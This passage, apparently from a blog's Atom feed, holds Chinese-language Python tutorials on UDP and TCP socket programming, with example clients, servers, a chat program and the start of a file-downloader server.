class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建udp套接字</span></span><br><span class="line">udp_socket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 准备接收方的地址</span></span><br><span class="line">dest_addr = (<span class="string">'192.168.236.129'</span>, <span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 从键盘获取数据</span></span><br><span class="line">send_data = input(<span class="string">"请输入要发送的数据:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 发送数据到指定的电脑上</span></span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">'utf-8'</span>), dest_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 等待接收对方发送的数据</span></span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>)  <span class="comment"># 1024表示本次接收的最大字节数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 显示对方发送的数据</span></span><br><span class="line"><span class="comment"># 接收到的数据recv_data是一个元组</span></span><br><span class="line"><span class="comment"># 第1个元素是对方发送的数据</span></span><br><span class="line"><span class="comment"># 第2个元素是对方的ip和端口</span></span><br><span class="line">print(recv_data[<span class="number">0</span>].decode(<span class="string">'gbk'</span>))</span><br><span class="line">print(recv_data[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 关闭套接字</span></span><br><span class="line">udp_socket.close()</span><br></pre></td></tr></table></figure><p>python脚本：<br><img src="/images_udp/010.png" alt></p><p>网络调试助手截图：<br><img src="/images_udp/011.png" alt></p><h1 id="python3编码转换"><a href="#python3编码转换" class="headerlink" title="python3编码转换"></a>python3编码转换</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str-&gt;bytes:encode编码</span><br><span class="line">bytes-&gt;str:decode解码</span><br></pre></td></tr></table></figure><p>字符串通过编码成为字节码，字节码通过解码成为字符串。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'我是文本'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text</span><br><span class="line"><span class="string">'我是文本'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(text)</span><br><span class="line">我是文本</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytesText = text.encode()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytesText</span><br><span class="line"><span class="string">b'\xe6\x88\x91\xe6\x98\xaf\xe6\x96\x87\xe6\x9c\xac'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(bytesText)</span><br><span class="line"><span class="string">b'\xe6\x88\x91\xe6\x98\xaf\xe6\x96\x87\xe6\x9c\xac'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(text)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span><span class="params">(bytesText)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bytes</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; textDecode = bytesText.decode()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>textDecode</span><br><span class="line"><span class="string">'我是文本'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(textDecode)</span><br><span class="line">我是文本</span><br></pre></td></tr></table></figure><p></p><p>其中decode()与encode()方法可以接受参数，其声明分别为:<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes.decode(encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"strict"</span>)</span><br><span class="line">str.encode(encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"strict"</span>)</span><br></pre></td></tr></table></figure><p></p><p>其中的encoding是指在解码编码过程中使用的编码(此处指“编码方案”是名词)，errors是指错误的处理方案。</p><h1 id="udp绑定信息"><a href="#udp绑定信息" class="headerlink" title="udp绑定信息"></a>udp绑定信息</h1><h2 id="udp网络程序-端口问题"><a href="#udp网络程序-端口问题" class="headerlink" title="udp网络程序-端口问题"></a>udp网络程序-端口问题</h2><ul><li>会变的端口号<br>重新运行多次脚本，然后在“网络调试助手”中，看到的现象如下：<br><img src="/images_udp/012.png" alt></li></ul><p>说明：</p><ul><li>每重新运行一次网络程序，上图中红圈中的数字，不一样的原因在于，这个数字标识这个网络程序，当重新运行时，如果没有确定到底用哪个，系统默认会随机分配</li><li>记住一点：这个网络程序在运行的过程中，这个就唯一标识这个程序，所以如果其他电脑上的网络程序如果想要向此程序发送数据，那么就需要向这个数字（即端口）标识的程序发送即可</li></ul><h2 id="udp绑定信息-1"><a href="#udp绑定信息-1" class="headerlink" title="udp绑定信息"></a>udp绑定信息</h2><h3 id="绑定信息"><a href="#绑定信息" class="headerlink" title="绑定信息"></a>绑定信息</h3><p>一般情况下，在一台电脑上运行的网络程序有很多，为了不与其他的网络程序占用同一个端口号，往往在编程中，udp的端口号一般不绑定<br>但是如果需要做成一个服务器端的程序的话，是需要绑定的，想想看这又是为什么呢？<br>如果报警电话每天都在变，想必世界就会乱了，所以一般服务性的程序，往往需要一个固定的端口号，这就是所谓的端口绑定</p><h3 id="绑定示例"><a href="#绑定示例" class="headerlink" title="绑定示例"></a>绑定示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建套接字</span></span><br><span class="line">udp_socket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 绑定本地的相关信息，如果一个网络程序不绑定，则系统会随机分配</span></span><br><span class="line">local_addr = (<span class="string">''</span>, <span class="number">7788</span>) <span class="comment">#  ip地址和端口号，ip一般不用写，表示本机的任何一个ip</span></span><br><span class="line">udp_socket.bind(local_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 等待接收对方发送的数据</span></span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>) <span class="comment">#  1024表示本次接收的最大字节数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 显示接收到的数据</span></span><br><span class="line">print(recv_data[<span class="number">0</span>].decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭套接字</span></span><br><span class="line">udp_socket.close()</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/images_udp/013.png" alt></p><p>总结:</p><ul><li>一个udp网络程序，可以不绑定，此时操作系统会随机进行分配一个端口，如果重新运行此程序端口可能会发生变化</li><li>一个udp网络程序，也可以绑定信息（ip地址，端口号），如果绑定成功，那么操作系统用这个端口号来进行区别收到的网络数据是否是此进程的</li></ul><h1 id="网络通信过程-简单版"><a href="#网络通信过程-简单版" class="headerlink" title="网络通信过程(简单版)"></a>网络通信过程(简单版)</h1><p>网络通信过程中，之所需要ip、port等，就是为了能够将一个复杂的通信过程进行任务划分，从而保证数据准确无误的传递</p><h1 id="应用：udp聊天器"><a href="#应用：udp聊天器" class="headerlink" title="应用：udp聊天器"></a>应用：udp聊天器</h1><p>说明</p><ul><li>在一个电脑中编写1个程序，有2个功能<br>1.获取键盘数据，并将其发送给对方<br>2.接收数据并显示</li><li>并且功能数据进行选择以上的2个功能调用</li></ul><p>参考代码:<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""获取键盘数据，并将其发送给对方"""</span></span><br><span class="line">    <span class="comment"># 1. 从键盘输入数据</span></span><br><span class="line">    msg = input(<span class="string">"\n请输入要发送的数据:"</span>)</span><br><span class="line">    <span class="comment"># 2. 输入对方的ip地址</span></span><br><span class="line">    dest_ip = input(<span class="string">"\n请输入对方的ip地址:"</span>)</span><br><span class="line">    <span class="comment"># 3. 输入对方的port</span></span><br><span class="line">    dest_port = int(input(<span class="string">"\n请输入对方的port:"</span>))</span><br><span class="line">    <span class="comment"># 4. 发送数据</span></span><br><span class="line">    udp_socket.sendto(msg.encode(<span class="string">"utf-8"</span>), (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""接收数据并显示"""</span></span><br><span class="line">    <span class="comment"># 1. 接收数据</span></span><br><span class="line">    recv_msg = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># 2. 解码</span></span><br><span class="line">    recv_ip = recv_msg[<span class="number">1</span>]</span><br><span class="line">    recv_msg = recv_msg[<span class="number">0</span>].decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="comment"># 3. 显示接收到的数据</span></span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;%s:%s"</span> % (str(recv_ip), recv_msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="comment"># 2. 绑定本地信息</span></span><br><span class="line">    udp_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 3. 选择功能</span></span><br><span class="line">        print(<span class="string">"="</span>*<span class="number">30</span>)</span><br><span class="line">        print(<span class="string">"1:发送消息"</span>)</span><br><span class="line">        print(<span class="string">"2:接收消息"</span>)</span><br><span class="line">        print(<span class="string">"="</span>*<span class="number">30</span>)</span><br><span class="line">        op_num = input(<span class="string">"请输入要操作的功能序号:"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 根据选择调用相应的函数</span></span><br><span class="line">        <span class="keyword">if</span> op_num == <span class="string">"1"</span>:</span><br><span class="line">            send_msg(udp_socket)</span><br><span class="line">        <span class="keyword">elif</span> op_num == <span class="string">"2"</span>:</span><br><span class="line">            recv_msg(udp_socket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"输入有误，请重新输入..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p></p><p>想一想</p><ul><li>以上的程序如果选择了接收数据功能，并且此时没有数据，程序会堵塞在这，那么怎样才能让这个程序收发数据一起进行呢？</li></ul><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;网络通信概述&quot;&gt;&lt;a href=&quot;#网络通信概述&quot; class=&quot;headerlink&quot; title=&quot;网络通信概述&quot;&gt;&lt;/a&gt;网络通信概述&lt;/h1&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;什么是网络&lt;br&gt;一种辅助双方或者多方能够连接在一起的工具&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;使用网络的目的&lt;br&gt;就是为了联通多方然后进行通信用的，即把数据从一方传递给另外一方,为了让在不同的电脑上运行的软件之间能够互相传递数据，就需要借助网络的功能&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;小总结:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用网络能够把多方链接在一起，然后可以进行数据传递&lt;/li&gt;&lt;li&gt;所谓的网络编程就是，让在不同的电脑上的软件能够进行数据传递，即进程之间的通信&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;/images_udp/001.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="udp" scheme="https://yongnights.github.io/tags/udp/"/>
    
  </entry>
  
  <entry>
    <title>网络_tcp</title>
    <link href="https://yongnights.github.io/2019/12/31/%E7%BD%91%E7%BB%9C_tcp/"/>
    <id>https://yongnights.github.io/2019/12/31/网络_tcp/</id>
    <published>2019-12-31T04:00:48.285Z</published>
    <updated>2019-12-31T04:00:48.286Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h1 id="TCP简介"><a href="#TCP简介" class="headerlink" title="TCP简介"></a>TCP简介</h1><h2 id="TCP介绍"><a href="#TCP介绍" class="headerlink" title="TCP介绍"></a>TCP介绍</h2><p>TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。<br>TCP通信需要经过创建连接、数据传送、终止连接三个步骤。<br>TCP通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，”打电话””</p><h2 id="TCP特点"><a href="#TCP特点" class="headerlink" title="TCP特点"></a>TCP特点</h2><h3 id="面向连接"><a href="#面向连接" class="headerlink" title="面向连接"></a>面向连接</h3><p>通信双方必须先建立连接才能进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输。<br>双方间的数据传输都可以通过这一个连接进行。<br>完成数据交换后，双方必须断开此连接，以释放系统资源。<br>这种连接是一对一的，因此TCP不适用于广播的应用程序，基于广播的应用程序请使用UDP协议。</p><h3 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h3><ol><li>TCP采用发送应答机制<br>TCP发送的每个报文段都必须得到接收方的应答才认为这个TCP报文段传输成功</li><li>超时重传<br>发送端发出一个报文段之后就启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段。<br>TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。</li></ol><a id="more"></a><h3 id="错误校验"><a href="#错误校验" class="headerlink" title="错误校验"></a>错误校验</h3><p>TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。</p><h3 id="流量控制和阻塞管理"><a href="#流量控制和阻塞管理" class="headerlink" title="流量控制和阻塞管理"></a>流量控制和阻塞管理</h3><p>流量控制用来避免主机发送得过快而使接收方来不及完全收下。</p><h2 id="TCP与UDP的不同点"><a href="#TCP与UDP的不同点" class="headerlink" title="TCP与UDP的不同点"></a>TCP与UDP的不同点</h2><ul><li>面向连接（确认有创建三方交握，连接已创建才作传输。）</li><li>有序数据传输重发丢失的数据包</li><li>舍弃重复的数据包</li><li>无差错的数据传输</li><li>阻塞/流量控制</li></ul><h2 id="udp通信模型"><a href="#udp通信模型" class="headerlink" title="udp通信模型"></a>udp通信模型</h2><p>udp通信模型中，在通信开始之前，不需要建立相关的链接，只需要发送数据即可，类似于生活中，”写信””<br><img src="/images_tcp/001.png" alt></p><h2 id="TCP通信模型"><a href="#TCP通信模型" class="headerlink" title="TCP通信模型"></a>TCP通信模型</h2><p>tcp通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，”打电话””<br><img src="/images_tcp/002.png" alt></p><h1 id="tcp客户端"><a href="#tcp客户端" class="headerlink" title="tcp客户端"></a>tcp客户端</h1><p>所谓的服务器端：就是提供服务的一方，而客户端，就是需要被服务的一方</p><h2 id="tcp客户端构建流程"><a href="#tcp客户端构建流程" class="headerlink" title="tcp客户端构建流程"></a>tcp客户端构建流程</h2><p>tcp的客户端要比服务器端简单很多，如果说服务器端是需要自己买手机、查手机卡、设置铃声、等待别人打电话流程的话，那么客户端就只需要找一个电话亭，拿起电话拨打即可，流程要少很多<br>示例代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket</span></span><br><span class="line">tcp_client_socket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目的信息</span></span><br><span class="line">server_ip = input(<span class="string">"请输入服务器ip:"</span>)</span><br><span class="line">server_port = int(input(<span class="string">"请输入服务器port:"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接服务器</span></span><br><span class="line">tcp_client_socket.connect((server_ip, server_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示用户输入数据</span></span><br><span class="line">send_data = input(<span class="string">"请输入要发送的数据："</span>)</span><br><span class="line"></span><br><span class="line">tcp_client_socket.send(send_data.encode(<span class="string">"gbk"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收对方发送过来的数据，最大接收1024个字节</span></span><br><span class="line">recvData = tcp_client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">'接收到的数据为:'</span>, recvData.decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">tcp_client_socket.close()</span><br></pre></td></tr></table></figure><p></p><h3 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h3><ol><li><p>tcp客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请输入服务器ip:10.10.0.47</span><br><span class="line">请输入服务器port:8080</span><br><span class="line">请输入要发送的数据：你好啊</span><br><span class="line">接收到的数据为: 我很好，你呢</span><br></pre></td></tr></table></figure></li><li><p>网络调试助手<br><img src="/images_tcp/003.png" alt></p></li></ol><h2 id="tcp服务器"><a href="#tcp服务器" class="headerlink" title="tcp服务器"></a>tcp服务器</h2><p>在程序中，如果想要完成一个tcp服务器的功能，需要的流程如下：</p><ol><li>socket创建一个套接字</li><li>bind绑定ip和port</li><li>listen使套接字变为可以被动链接</li><li>accept等待客户端的链接</li><li>recv/send接收发送数据<br>一个很简单的tcp服务器如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket</span></span><br><span class="line">tcp_server_socket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地信息</span></span><br><span class="line">address = (<span class="string">''</span>, <span class="number">7788</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定</span></span><br><span class="line">tcp_server_socket.bind(address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socket创建的套接字默认的属性是主动的，使用listen将其变为被动的，这样就可以接收别人的链接了</span></span><br><span class="line">tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果有新的客户端来链接服务器，那么就产生一个新的套接字专门为这个客户端服务</span></span><br><span class="line"><span class="comment"># client_socket用来为这个客户端服务</span></span><br><span class="line"><span class="comment"># tcp_server_socket就可以省下来专门等待其他新客户端的链接</span></span><br><span class="line">client_socket, clientAddr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收对方发送过来的数据</span></span><br><span class="line">recv_data = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收1024个字节</span></span><br><span class="line">print(<span class="string">'接收到的数据为:'</span>, recv_data.decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送一些数据到客户端</span></span><br><span class="line">client_socket.send(<span class="string">"thank you !"</span>.encode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭为这个客户端服务的套接字，只要关闭了，就意味着为不能再为这个客户端服务了，如果还需要服务，只能再次重新连接</span></span><br><span class="line">client_socket.close()</span><br></pre></td></tr></table></figure></li></ol><h3 id="运行流程-1"><a href="#运行流程-1" class="headerlink" title="运行流程"></a>运行流程</h3><ol><li><p>tcp服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收到的数据为: 你在么？</span><br></pre></td></tr></table></figure></li><li><p>网络调试助手<br><img src="/images_tcp/004.png" alt></p></li></ol><h1 id="tcp注意点"><a href="#tcp注意点" class="headerlink" title="tcp注意点"></a>tcp注意点</h1><ol><li>tcp服务器一般情况下都需要绑定，否则客户端找不到这个服务器</li><li>tcp客户端一般不绑定，因为是主动链接服务器，所以只要确定好服务器的ip、port等信息就好，本地客户端可以随机</li><li>tcp服务器中通过listen可以将socket创建出来的主动套接字变为被动的，这是做tcp服务器时必须要做的</li><li>当客户端需要链接服务器时，就需要使用connect进行链接，udp是不需要链接的而是直接发送，但是tcp必须先链接，只有链接成功才能通信</li><li>当一个tcp客户端连接服务器时，服务器端会有1个新的套接字，这个套接字用来标记这个客户端，单独为这个客户端服务</li><li>listen后的套接字是被动套接字，用来接收新的客户端的链接请求的，而accept返回的新套接字是标记这个新客户端的</li><li>关闭listen后的套接字意味着被动套接字关闭了，会导致新的客户端不能够链接服务器，但是之前已经链接成功的客户端正常通信。</li><li>关闭accept返回的套接字意味着这个客户端已经服务完毕</li><li>当客户端的套接字调用close后，服务器端会recv解堵塞，并且返回的长度为0，因此服务器可以通过返回数据的长度来区别客户端是否已经下线</li></ol><h1 id="案例-文件下载器"><a href="#案例-文件下载器" class="headerlink" title="案例:文件下载器"></a>案例:文件下载器</h1><h2 id="服务器-参考代码如下"><a href="#服务器-参考代码如下" class="headerlink" title="服务器 参考代码如下:"></a>服务器 参考代码如下:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="string">"""获取文件的内容"""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(file_name, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"没有下载的文件:%s"</span> % file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"请按照如下方式运行：python3 xxx.py 7890"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 运行方式为python3 xxx.py 7890</span></span><br><span class="line">        port = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建socket</span></span><br><span class="line">    tcp_server_socket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 本地信息</span></span><br><span class="line">    address = (<span class="string">''</span>, port)</span><br><span class="line">    <span class="comment"># 绑定本地信息</span></span><br><span class="line">    tcp_server_socket.bind(address)</span><br><span class="line">    <span class="comment"># 将主动套接字变为被动套接字</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 等待客户端的链接，即为这个客户端发送文件</span></span><br><span class="line">        client_socket, clientAddr = tcp_server_socket.accept()</span><br><span class="line">        <span class="comment"># 接收对方发送过来的数据</span></span><br><span class="line">        recv_data = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收1024个字节</span></span><br><span class="line">        file_name = recv_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(<span class="string">"对方请求下载的文件名为:%s"</span> % file_name)</span><br><span class="line">        file_content = get_file_content(file_name)</span><br><span class="line">        <span class="comment"># 发送文件的数据给客户端</span></span><br><span class="line">        <span class="comment"># 因为获取打开文件时是以rb方式打开，所以file_content中的数据已经是二进制的格式，因此不需要encode编码</span></span><br><span class="line">        <span class="keyword">if</span> file_content:</span><br><span class="line">            client_socket.send(file_content)</span><br><span 